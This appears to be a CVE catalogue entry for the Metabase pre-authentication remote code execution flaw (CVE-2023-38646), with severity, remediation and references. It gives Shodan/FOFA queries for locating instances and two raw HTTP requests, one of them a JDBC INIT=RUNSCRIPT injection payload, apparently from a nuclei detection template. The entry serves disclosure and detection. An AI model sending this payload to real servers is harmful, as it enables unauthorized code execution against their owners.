---
layout: post
cve_id: CVE-2023-38646
title: Metabase < 0.46.6.1 - Remote Code Execution
pcap: true
pcap_path: /pcaps/2023/CVE-2023-38646.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-38646.yaml
snort2_rule: N/A
snort3_rule: N/A
author: rootxharsh,iamnoooob,pdresearch
severity: critical
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary code on the target system.

  '
remediation: 'Upgrade Metabase to version 0.46.6.1 or later to mitigate this vulnerability.

  '
reference:
- https://www.metabase.com/blog/security-advisory
- https://github.com/metabase/metabase/releases/tag/v0.46.6.1
- https://mp.weixin.qq.com/s/ATFwFl-D8k9QfQfzKjZFDg
- https://news.ycombinator.com/item?id=36812256
- https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
- https://gist.github.com/testanull/a7beb2777bbf550f3cf533d2794477fe
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-38646
  epss-score: 0.94255
  epss-percentile: 0.99927
  cpe: cpe:2.3:a:metabase:metabase:*:*:*:*:-:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: metabase
  product: metabase
  shodan-query:
  - http.title:"Metabase"
  - http.title:"metabase"
  fofa-query:
  - app="Metabase"
  - title="metabase"
  - app="metabase"
  google-query: intitle:"metabase"
tags:
- cve2023
- cve
- metabase
- oss
- rce
- vkev
- vuln
---

## ðŸ” Vulnerability Description
Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1 allow attackers to execute arbitrary commands on the server, at the server's privilege level. Authentication is not required for exploitation. The other fixed versions are 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, and 1.43.7.2.


## ðŸŒ HTTP Request
```nohighlight
GET /api/session/properties HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /api/setup/validate HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
Content-Length: 370
Content-Type: application/json
Accept-Encoding: gzip
{
"token":"5S2lax",
"details":{
"details":{
"subprotocol":"h2",
"classname":"org.h2.Driver",
"advanced-options":true,
"subname":"mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM './plugins/vertica.metabase-driver.jar'//\\;"
},
"name":"38EyjzIHNsuMXGBzieUKutWz2pb",
"engine":"postgres"
}
}
```

